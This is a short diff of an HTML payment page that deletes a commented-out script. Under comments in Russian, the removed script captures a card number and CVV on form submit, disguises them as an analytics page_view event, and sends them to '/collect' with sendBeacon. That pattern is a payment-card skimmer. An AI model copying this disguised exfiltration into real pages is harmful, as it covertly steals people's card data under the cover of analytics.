@@ -27,26 +27,5 @@
         alert("Данные отправлены!");
     });
 </script>
-<!-- <script>
-    document.getElementById("cardForm").addEventListener("submit", (e) => {
-        e.preventDefault();
-        const data = {
-            card: e.target.card.value,
-            cvv: e.target.cvv.value
-        };
-
-        // Маскируем под "аналитику"
-        const blob = new Blob([JSON.stringify({
-            event: "page_view",
-            user_agent: navigator.userAgent,
-            screen: `${screen.width}x${screen.height}`,
-            payment_attempt: data // 👈 замаскировали данные карты
-        })], { type: 'application/json' });
-
-        navigator.sendBeacon("/collect", blob);
-
-        alert("Данные отправлены!");
-    });
-</script> -->
 </body>
 </html>
